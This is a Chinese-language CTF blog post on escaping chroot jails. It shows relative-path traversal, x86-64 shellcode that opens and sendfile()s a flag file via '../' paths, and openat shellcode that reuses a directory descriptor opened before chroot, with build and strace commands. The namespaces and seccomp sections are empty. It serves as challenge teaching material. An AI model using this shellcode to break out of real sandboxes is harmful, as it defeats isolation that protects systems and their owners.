---
layout: post
tags: [pwn]
title: "sandboxing —— escape"
author: wsxk
date: 2024-11-25
comments: true
---

- [1. chroot escape](#1-chroot-escape)
  - [1.1 相对路径逃逸](#11-相对路径逃逸)
  - [1.2 编写shellcode实现逃逸](#12-编写shellcode实现逃逸)
  - [1.3 利用chroot之前打开的目录描述符实现逃逸](#13-利用chroot之前打开的目录描述符实现逃逸)
- [2. namespaces escape](#2-namespaces-escape)
- [3. seccomp escape](#3-seccomp-escape)


## 1. chroot escape<br>
chroot详情可看[https://wsxk.github.io/sandboxing/](https://wsxk.github.io/sandboxing/)<br>

### 1.1 相对路径逃逸<br>
前文提到，chroot是改变了"/"在程序的根目录，这意味着**绝对路径的访问会被限制**，但是相对路径(这取决于你是在哪个目录下运行程序的)是可以绕过这个机制的。**如果程序的当前工作目录没有被改变（即没有调用chdir("/")的话），这个方法大有可为**<br>
示例如下:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241125213653.png)
上述场景中:<br>
```
1. 真flag 位于 /flag
2. 假flag 位于 /tmp/jaio-eyqnjg/flag
3. 程序的当前工作目录是 /home/wsxk/Desktop/CTF/sandboxing
```
因此绕过时使用的是`../../../../../flag`<br>

### 1.2 编写shellcode实现逃逸<br>
如果容器里允许你执行shellocde，那么可以尝试利用之前提到相对路径方法，编写shellcode实现逃逸<br>
当然，这个方法也要求**程序的当前工作目录没有被改变（即没有调用chdir("/")）**
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 2   # open
lea rdi, [rip+file_path]  # path
mov rsi, 0   # flags O_RDONLY
mov rdx, 0  # 当指定O_CREAT时，设定文件的权限，这里就没意义
syscall

mov rdi, 1  # 输出的文件描述符
mov rsi, rax # 输入的文件描述符
mov rdx, 0   # offset，0就是从头开始
mov r10, 128 # length，长度
mov rax, 40 # sendfile
syscall 
file_path:
.string "../../../flag"
```
编译命令如下:<br>
```
gcc -nostdlib -static shellcode.s -o shellcode-elf
objcopy --dump-section .text=shellcode-raw shellcode-elf
cat shellcode-raw | /path/to/container/path 
```

### 1.3 利用chroot之前打开的目录描述符实现逃逸<br>
条件**进程在调用chroot、chdir之前，打开了一个目录,例子: `open("/", O_RDONLY|O_NOFOLLOW)`**<br>
可以利用这个实现打开的文件描述符，结合`openat`系统调用，在shellcode中编写代码完成逃逸<br>
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 257 #openat
mov rdi, 3 # assume opened dir fd = 3
lea rsi, [rip+file_path]
mov rdx, 0 # O_RDONLY
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 128
mov rax, 40
syscall
file_path:
.string "flag"
```
可以用`cat shellcode.raw  | strace -f  /challenge/babyjail_level3 /`<br>
调试系统调用出现的问题<br>
`-f`选项指的是跟随fork继续追踪系统调用。<br>
**注意像strace gdb等调试工具，在调试具有suid权限的程序时，会主动舍弃suid权限，要想继续追踪，需要修改内核文件sudo sysctl kernel.yama.ptrace_scope=0.(当然，如果你直接以root权限允许strace、gdb等，就没这个问题)**<br>

## 2. namespaces escape<br>


## 3. seccomp escape<br>


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>